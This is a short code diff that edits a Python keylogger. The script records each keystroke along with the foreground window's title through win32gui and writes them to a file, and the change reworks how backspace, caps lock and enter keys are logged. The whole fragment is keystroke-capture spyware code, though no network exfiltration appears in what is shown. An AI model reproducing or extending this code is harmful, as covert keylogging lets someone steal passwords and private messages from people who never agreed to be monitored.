@@ -10,7 +10,6 @@ for i in alf_comp:
     i = i.replace("'", "")
     alf.append(i)
 
-
 def on_press(key):
     hwnd = win32gui.GetForegroundWindow()
     win_title = win32gui.GetWindowText(hwnd)
@@ -22,9 +21,11 @@ def on_press(key):
             f.write(key)
         elif key == "Key.space":
             f.write(" ")
-        elif key == "Key.backspace" or key == "Key.caps_lock":
+        elif key == "Key.backspace":
             pass
-        else:
+        elif key == "Key.caps_lock":
+            pass
+        elif key == "Key.enter":
             f.write("\n" + key + "\n")
 
 
